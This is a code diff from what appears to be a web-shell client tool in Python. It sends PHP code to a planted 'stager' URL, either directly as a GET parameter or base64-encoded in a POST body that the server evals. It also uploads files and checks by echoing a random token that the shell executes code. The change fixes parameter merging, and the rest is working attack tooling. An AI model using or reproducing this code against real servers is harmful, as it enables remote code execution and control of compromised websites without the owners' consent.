@@ -13,10 +13,10 @@ UPLOAD_PAYLOAD = '''echo move_uploaded_file($_FILES['file']['tmp_name'], $_GET['
 
 def execute_code(stager_url: str, code: str, post: bool = False, params: set = {}, data: set = {}) -> str:
     if post:
-        r = requests.post(stager_url, params={'c': "eval(base64_decode($_POST['p']));"} + params,
-                          data={'p': base64.b64encode(code.encode())} + data)
+        r = requests.post(stager_url, params=util.sum_dicts({'c': "eval(base64_decode($_POST['p']));"}, params),
+                          data=util.sum_dicts({'p': base64.b64encode(code.encode())}, data))
     else:
-        r = requests.get(stager_url, params={'c': code} + params)
+        r = requests.get(stager_url, params=util.sum_dicts({'c': code}, params))
 
     return r.text
 
@@ -50,7 +50,7 @@ def upload_file(stager_url: str, file: object, remote_path: str, param: str = 'c
 
 def perform_basic_tests(stager_url: str) -> bool:
     token = util.random_string(15)
-    if execute_code(stager_url, f'echo "{token}"') != token:
+    if execute_code(stager_url, f'echo "{token}";') != token:
         return False
 
     # Add more eventual tests further on
